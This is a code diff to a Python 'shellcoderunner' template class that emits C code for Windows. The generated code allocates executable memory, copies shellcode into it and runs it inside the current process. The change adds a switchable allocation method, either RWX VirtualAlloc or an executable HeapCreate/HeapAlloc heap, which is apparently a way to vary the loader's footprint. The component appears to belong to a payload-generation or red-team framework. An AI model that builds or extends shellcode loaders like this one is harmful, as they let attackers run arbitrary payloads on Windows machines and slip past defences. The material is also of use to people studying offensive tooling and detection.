@@ -2,7 +2,19 @@ from string import Template
 
 class shellcoderunner:
     def __init__(self, arguments):
-        pass
+        self.allocation = 'VirtualAlloc'
+        if 'allocation' in arguments:
+            self.allocation = arguments['allocation']
+
+        if self.allocation == 'VirtualAlloc':
+            self.allocationCode = """
+    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+"""
+        elif self.allocation == 'HeapAlloc':
+            self.allocationCode = """
+    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
+    LPVOID buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
+"""
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -16,10 +28,10 @@ class shellcoderunner:
         return """"""
 
     def template(self) -> str:
-        return """
+        return Template("""
     {transformers}
     // Allocate a region of RWX memory for shellcode
-    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    $allocation
 
     // Copy our shellcode into memory that we just allocated (inside of our current process)
     memcpy(buffer, shellcode, {shellcodeSize});
@@ -36,4 +48,4 @@ class shellcoderunner:
     VirtualFree(buffer, 0, MEM_RELEASE);
 
     return 0;
-"""
+""").substitute(allocation=self.allocationCode)
